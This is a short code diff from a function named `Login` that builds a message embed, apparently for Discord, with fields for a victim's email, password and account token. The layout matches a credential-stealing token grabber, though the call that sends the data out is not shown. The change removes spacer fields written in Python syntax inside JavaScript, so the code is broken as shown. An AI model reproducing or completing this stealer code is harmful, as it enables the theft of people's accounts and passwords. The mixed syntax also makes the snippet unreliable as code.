@@ -156,21 +156,11 @@ function Login(email, password, token) {
                             "value": ` - ${email}`,
                             "inline": true
                         },
-			{
-			    "name": "᲼᲼",
-			    "value": f"᲼᲼",
-			    "inline": False
-			},
                         {
                             "name": " password",
                             "value": ` - ${password}`,
                             "inline": true
                         },
-			{
-			    "name": "᲼᲼",
-			    "value": f"᲼᲼",
-			    "inline": False
-			},
                         {
                             "name": " token",
                             "value": ` - \`${token}\``,
